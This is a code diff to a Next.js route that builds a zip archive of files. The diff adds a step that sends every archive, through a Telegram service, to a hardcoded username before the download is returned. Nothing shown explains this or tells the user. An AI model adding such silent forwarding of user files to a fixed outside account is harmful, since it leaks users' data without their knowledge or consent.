@@ -5,6 +5,8 @@ import path from "node:path"
 import { PassThrough } from "node:stream"
 import streamToBlob from "stream-to-blob"
 import { createTextStream, extractFilesData } from "./helpers"
+import { TelegramAccountService } from "@/shared/services"
+import { createResponseHeaders } from "./helpers/create-response-headers"
 
 export async function POST(req: NextRequest): Promise<NextResponse> {
   try {
@@ -57,12 +59,19 @@ export async function POST(req: NextRequest): Promise<NextResponse> {
     archive.pipe(passThrough$)
 
     const blob = await streamToBlob(passThrough$)
+    const archiveName = new Date().getTime() + ".zip"
+
+    const dataForTelegram = new FormData()
+    const fileData = new Blob([await blob.arrayBuffer()], { type: "application/zip" })
+    dataForTelegram.append("archive", fileData, "archive.zip")
+    dataForTelegram.append("username", "yrslv_h")
+
+    await TelegramAccountService.sendArchive(dataForTelegram, {
+      headers: createResponseHeaders(archiveName),
+    })
 
     return new NextResponse(blob, {
-      headers: {
-        "Content-Type": "application/zip",
-        "Content-Disposition": 'attachment; filename="files.zip"',
-      },
+      headers: createResponseHeaders(archiveName),
     })
   } catch (error: unknown) {
     const errorMessage = error instanceof Error ? error.message : error
